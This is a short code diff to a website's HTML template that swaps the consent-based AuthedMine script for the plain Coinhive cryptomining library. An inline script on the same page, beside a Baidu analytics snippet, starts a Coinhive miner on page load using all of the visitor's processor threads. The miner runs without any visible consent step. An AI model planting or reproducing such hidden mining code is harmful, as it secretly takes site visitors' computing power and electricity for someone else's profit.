@@ -154,7 +154,8 @@
  <script type="text/javascript">
  (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');})();
  </script>
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+{{--<script src="https://authedmine.com/lib/authedmine.min.js"></script>--}}
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script type="text/javascript">
     var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b1490187b42d2a969b6f51c5f8f4e814";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.8,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 </script>
